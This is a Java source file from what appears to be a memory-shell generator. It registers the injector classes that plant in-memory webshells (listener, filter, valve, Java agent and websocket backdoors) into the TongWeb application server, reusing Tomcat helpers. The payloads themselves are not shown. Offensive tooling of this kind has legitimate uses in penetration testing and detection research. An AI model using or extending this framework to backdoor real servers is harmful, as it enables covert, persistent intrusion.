package com.reajason.javaweb.memshell.server.tongweb;

import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.tomcat.Tomcat;
import com.reajason.javaweb.memshell.server.tomcat.TomcatRawWsHelperGenerator;


import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class TongWeb extends AbstractServer {

    @Override
    public Class<?> getListenerInterceptor() {
        return Tomcat.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.tongweb.TongWebValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.tongweb.TongWebValveInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tongweb.TongWebFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tongweb.TongWebContextValveAgentInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.tongweb.TongWebWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tongweb.TongWebWebSocketInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tongweb.TongWebRawWsInjector")
                .addInjector(JAKARTA_RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tongweb.TongWebRawWsInjector")
                .build();
    }

    /**
     * TongWeb 6/7/8 都是 Tomcat 的二开版本，coyote 与 SocketWrapperBase 结构一致，
     * RawWebSocket 复用 Tomcat 系 helper。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())
                || JAKARTA_RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(TomcatRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
